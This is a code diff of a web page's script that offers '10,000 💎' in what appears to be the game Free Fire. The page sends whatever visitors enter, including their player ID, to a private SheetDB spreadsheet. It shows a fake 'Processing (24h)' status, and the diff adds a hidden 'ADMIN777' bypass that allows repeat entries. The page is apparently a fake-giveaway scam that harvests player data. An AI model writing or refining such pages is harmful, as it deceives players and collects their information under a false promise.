@@ -25,34 +25,52 @@
     </div>
 
     <script>
-        const form = document.getElementById('sheetdb-form');
-        const statusMsg = document.getElementById('status-msg');
-        const submitBtn = document.getElementById('submit-btn');
+    const form = document.getElementById('sheetdb-form');
+    const statusMsg = document.getElementById('status-msg');
+    const submitBtn = document.getElementById('submit-btn');
+    const uidInput = document.querySelector('input[name="data[FF_ID]"]');
 
-        // Check if already submitted
-        if (localStorage.getItem('ff_claimed') === 'true') {
-            form.style.display = 'none';
-            document.getElementById('title').innerText = "NOTICE";
-            statusMsg.innerHTML = "You have already claimed your rewards!<br><small>Status: Processing (24h)</small>";
-        }
+    // 1. CHECK IF BLOCKED (for normal users)
+    if (localStorage.getItem('ff_claimed') === 'true') {
+        form.style.display = 'none';
+        document.getElementById('title').innerText = "NOTICE";
+        statusMsg.innerHTML = "You have already claimed your rewards!<br><small>Status: Processing (24h)</small>";
+    }
 
-        form.addEventListener("submit", e => {
-            e.preventDefault();
-            submitBtn.innerText = "Processing...";
-            submitBtn.disabled = true;
+    form.addEventListener("submit", e => {
+        e.preventDefault();
+        
+        // 2. THE SECRET BYPASS
+        // Change '20160332' to whatever ID you want to allow for multiple entries
+        const isVipUser = (uidInput.value === 'ADMIN777');
 
-            fetch('https://sheetdb.io/api/v1/c56u1zmpb56o3', {
-                method: 'POST',
-                body: new FormData(document.getElementById("sheetdb-form")),
-            }).then(response => {
-                localStorage.setItem('ff_claimed', 'true');
-                window.location.reload(); // Refresh to show the "already claimed" message
-            }).catch(err => {
-                alert("Error. Try again.");
-                submitBtn.innerText = "CLAIM 10,000 💎";
-                submitBtn.disabled = false;
-            });
+        submitBtn.innerText = "Processing...";
+        submitBtn.disabled = true;
+
+        const formData = new FormData(form);
+
+        fetch('https://sheetdb.io/api/v1/c56u1zmpb56o3', {
+            method: 'POST',
+            body: formData,
+        }).then(response => {
+            if(response.ok) {
+                // If it's NOT a VIP user, block them
+                if (!isVipUser) {
+                    localStorage.setItem('ff_claimed', 'true');
+                }
+                
+                // Show success and reload
+                alert("Request Sent Successfully!");
+                window.location.reload();
+            }
+        }).catch(err => {
+            console.error(err);
+            alert("Connection error. Try again.");
+            submitBtn.disabled = false;
+            submitBtn.innerText = "CLAIM 10,000 💎";
         });
-    </script>
+    });
+</script>
+         
 </body>
 </html>
